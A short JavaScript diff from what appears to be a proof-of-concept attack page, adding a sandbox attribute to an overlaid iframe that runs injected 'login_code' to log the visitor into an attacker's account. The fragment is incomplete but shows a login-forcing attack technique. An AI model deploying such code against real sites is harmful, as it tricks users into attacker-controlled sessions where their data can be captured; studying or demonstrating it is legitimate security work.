@@ -26,6 +26,7 @@
             attackerLoginFrame.setAttribute('src', 'javascript:'+ login_code );
             attackerLoginFrame.setAttribute('width', '100px');
             attackerLoginFrame.setAttribute('height', '100px');
+            attackerLoginFrame.setAttribute('sandbox', 'allow-scripts');
             attackerLoginFrame.setAttribute('style', 'position:absolute;z-index:999;top: 100px;');
             //Log in to attacker account
             document.body.appendChild(attackerLoginFrame);
